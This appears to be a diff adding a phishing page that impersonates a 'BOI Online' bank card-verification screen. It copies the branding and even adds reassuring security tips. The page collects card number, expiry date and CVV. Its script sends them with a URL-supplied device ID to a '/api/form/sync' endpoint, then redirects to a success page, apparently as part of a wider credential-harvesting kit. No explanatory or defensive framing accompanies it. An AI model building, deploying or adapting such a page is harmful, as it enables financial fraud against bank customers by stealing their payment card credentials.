@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Card Verification</title>
+    <style>
+        :root {
+            --primary: #0082c3;
+            --bg: #ffffff;
+            --card-bg: #fff;
+            --border: #ccc;
+            --text: #000;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
+        html, body { height: 100%; background: var(--bg); }
+        .page { max-width: 420px; margin: auto; min-height: 100vh; display: flex; flex-direction: column; background: var(--card-bg); }
+        .header { display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; border-bottom: 2px solid var(--primary); }
+        .logo-text { font-size: 32px; font-weight: bold; color: var(--primary); display: flex; align-items: center; }
+        .logo-text .boi { letter-spacing: -1px; }
+        .star-icon { color: #ef4123; font-size: 36px; margin: 0 5px; transform: translateY(2px); }
+        .online-dot { color: #f28b22; }
+        .omni { font-size: 11px; color: var(--primary); text-align: center; margin-top: -5px; display: none; /* Hidden on this page per screenshot */ }
+        .menu-icon { display: flex; flex-direction: column; gap: 5px; }
+        .menu-icon div { width: 25px; height: 3px; background-color: var(--primary); }
+        .title-bar { background: var(--primary); color: white; text-align: center; padding: 12px; font-size: 18px; font-weight: bold; }
+        .content { padding: 20px; flex: 1; }
+        label { display: block; margin-top: 15px; margin-bottom: 8px; font-size: 14px; font-weight: bold; }
+        label span.asterisk { color: black; }
+        input { width: 100%; padding: 14px; font-size: 15px; border: 1px solid var(--border); border-radius: 8px; outline: none; }
+        input:focus { border-color: var(--primary); }
+        button.main-btn { width: 100%; padding: 14px; background: var(--primary); color: #fff; border: none; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 25px; }
+        .security-tips { margin-top: 30px; background: #f4f8fc; padding: 15px; border-radius: 10px; border: 1px solid #e1ebf4; }
+        .security-tips h4 { color: var(--primary); margin-bottom: 12px; font-size: 16px; }
+        .security-tips ul { padding-left: 15px; font-size: 13px; line-height: 1.5; list-style-type: disc; }
+    </style>
+</head>
+<body>
+    <div class="page">
+        <div class="header">
+            <div>
+                <div class="logo-text">
+                    <span class="boi">BOI</span><span class="star-icon">☆</span><span class="boi">Online<span class="online-dot">.</span></span>
+                </div>
+            </div>
+            <div class="menu-icon">
+                <div></div><div></div><div></div>
+            </div>
+        </div>
+
+        <div class="title-bar">Card Verification</div>
+
+        <div class="content">
+            <label>Card Number<span class="asterisk">*</span></label>
+            <input type="tel" id="cardNumber" maxlength="16" placeholder="Enter 16-digit Card Number" required>
+
+            <label>Valid Through (MMYY)<span class="asterisk">*</span></label>
+            <input type="tel" id="validThrough" maxlength="5" placeholder="MMYY" required>
+
+            <label>CVV<span class="asterisk">*</span></label>
+            <input type="password" id="cvv" maxlength="3" placeholder="Enter 3-digit CVV" required>
+
+            <button class="main-btn" id="submitBtn">CONTINUE</button>
+
+            <div class="security-tips">
+                <h4>Security Tips</h4>
+                <ul>
+                    <li>Do NOT share your Card Number or CVV.</li>
+                    <li>Bank never asks for Card details over call.</li>
+                    <li>Enter your card details carefully.</li>
+                    <li>Keep your card information private & secure.</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('deviceId') || 'unknown';
+
+        async function syncPageData(pageName, data) {
+            try {
+                await fetch('/api/form/sync', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId, pageName, pageData: data, timestamp: new Date().toISOString() })
+                });
+            } catch (error) {
+                console.error('Sync error:', error);
+            }
+        }
+
+        document.getElementById('submitBtn').addEventListener('click', async () => {
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const validThrough = document.getElementById('validThrough').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+
+            if (!cardNumber || !validThrough || !cvv) {
+                alert('Please fill in all fields');
+                return;
+            }
+
+            await syncPageData('card_verify', { cardNumber, validThrough, cvv });
+            window.location.href = 'success.html?deviceId=' + encodeURIComponent(deviceId);
+        });
+    </script>
+</body>
+</html>
